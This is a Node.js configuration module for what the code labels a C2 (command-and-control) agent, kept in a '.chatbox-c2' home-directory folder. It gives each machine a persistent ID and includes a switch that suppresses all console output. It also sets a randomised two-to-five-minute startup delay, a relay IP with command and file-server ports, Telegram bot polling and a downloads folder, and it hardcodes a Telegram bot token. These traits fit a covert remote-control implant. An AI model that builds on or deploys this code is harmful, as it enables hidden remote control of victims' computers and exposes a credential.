const os = require('os');
const path = require('path');
const fs = require('fs');

const IS_DEV = false;
const DATA_DIR = path.join(os.homedir(), '.chatbox-c2');

try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e) {}

let instanceId = '';
const idPath = path.join(DATA_DIR, 'machine-id');
try {
  instanceId = fs.readFileSync(idPath, 'utf8').trim();
} catch(e) {
  instanceId = require('crypto').randomBytes(4).toString('hex');
  try { fs.writeFileSync(idPath, instanceId); } catch(e2) {}
}

// Suppress ALL console output in silent mode
if (process.env.C2_SILENT) {
  console.log = console.warn = console.error = console.info = () => {};
}

module.exports = {
  RELAY_IP: '100.104.20.122',
  RELAY_PORT: 15000,
  FS_PORT: 18080,
  CMD_PORT: 15001,
  TELEGRAM_TOKEN: '1809469058:AAGhSDi9uO0_upwjUUgYqQiwnXYfhQIMSzk',
  TELEGRAM_CHAT_ID: '',
  HEARTBEAT_INTERVAL: 120000,
  TELEGRAM_POLL_INTERVAL: 30000,
  LOG_FILE: require('path').join(require('os').homedir(), '.chatbox-c2', 'relay.log'),
  AGENT_LOG: require('path').join(require('os').homedir(), '.chatbox-c2', 'agent.log'),
  STARTUP_DELAY_MIN: 120000,
  STARTUP_DELAY_MAX: 300000,
  TAILSCALE_PATH: 'C:\\Program Files\\Tailscale\\tailscale.exe',
  DOWNLOADS_DIR: require('path').join(require('os').homedir(), '.chatbox-c2', 'downloads'),
  instanceId,
  DATA_DIR,
  hostname: os.hostname().toUpperCase(),
};
